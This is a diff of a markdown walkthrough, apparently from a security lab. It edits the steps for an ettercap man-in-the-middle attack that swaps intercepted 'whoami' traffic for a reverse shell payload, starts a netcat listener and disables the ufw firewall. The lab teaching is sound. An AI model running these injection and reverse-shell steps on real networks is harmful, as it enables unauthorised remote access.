@@ -788,9 +788,11 @@ prints the help screen with a short summary of the available options.
 
 ```
 
-- Now, create a new **etterfilter code file** named `whoami.ecf` and try to **write a filter matching Alice's source port and transport protocol** as well as **replacing whoami data with a reverse shell payload** of your choice.
+1. Create a new `etterfilter code` file named `whoami.ecf`  
 
-- Now, create a new etterfilter code file named `whoami.ecf` and try to write a filter matching **Alice's source port** and **transport protocol** as well as replacing `whoami` data with a **`reverse shell payload`** of your choice.
+    - `nano whoami.ecf`
+
+2. Try to write a filter matching **Alice's source port** `4444` and **transport protocol** `TCP` as well as replacing `whoami` data with a **`reverse shell payload`** of your choice.
 
 - In the end, your filter might look similar to this one, where **`<reverse_shell>`** contains the reverse shell payload you chose:
 
@@ -830,15 +832,23 @@ if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
 
 ```
 
-- Finally, we need to compile the `.ecf` into an `.ef` file:
+- **Step 1 & Step 2:**
+
+![image](https://user-images.githubusercontent.com/94720207/166802864-dbcd4141-15b2-41f9-96ac-be03ed71f6da.png)
+
+3. Finally, we need to compile the `.ecf` into an `.ef` file:
 
     - `etterfilter whoami.ecf -o whoami.ef `
+
+![image](https://user-images.githubusercontent.com/94720207/166803486-4bbff01d-645f-4672-8b6c-4d0680891f7a.png)
 
 - Start your listener _(backgrounded)_. For the upper example above, you could use:
 
     - `nc -nvlp 666 &`
 
-- **Not so fast!** If anything, we still need to allow the incoming connection through the **firewall**. 
+![image](https://user-images.githubusercontent.com/94720207/166803985-68176d8f-da00-47e2-bb04-76c8ac1d15af.png)
+
+- **Before launching the Attack**, we still need to allow the incoming connection through the **`firewall`**. 
 
     - **Disable `ufw`** or create a corresponding allow rule; otherwise, Bob's reverse shell will be blocked by the firewall:
     
